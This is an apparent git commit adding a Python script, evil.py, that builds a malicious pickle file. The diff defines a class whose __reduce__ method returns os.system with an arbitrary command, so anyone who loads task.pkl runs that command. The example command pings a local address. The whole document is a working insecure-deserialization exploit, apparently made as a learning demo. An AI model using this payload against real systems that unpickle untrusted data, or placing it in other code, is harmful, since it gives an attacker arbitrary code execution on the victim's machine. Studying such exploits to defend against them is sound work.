d1277863364de50a08ade64baa3fc5c13d32fed7
3sss1r <3sss1r@gmail.com>
2020-11-18 00:09:35 +0300

    worked evil.py

--- evil.py
+++ evil.py
@@ -1,14 +1,21 @@
 import pickle
+import os
 
-from task import Task
+
+class EvilTask:
+    def __init__(self, name, action):
+        self.name = name
+        self.action = action
+
+    def __reduce__(self):
+        return (os.system, (self.action,))
 
 
-def create_evil_task():
-    task = Task('my_task', 'jump')
-
+def create_evil_task(name, action):
+    evil_task = EvilTask(name, action)
     with open('task.pkl', mode='wb') as f:
-        pickle.dump(task, file=f)
+        pickle.dump(evil_task, file=f)
 
 
 if __name__ == '__main__':
-    create_evil_task()
+    create_evil_task('evil task', 'cmd /K ping 192.168.1.106')
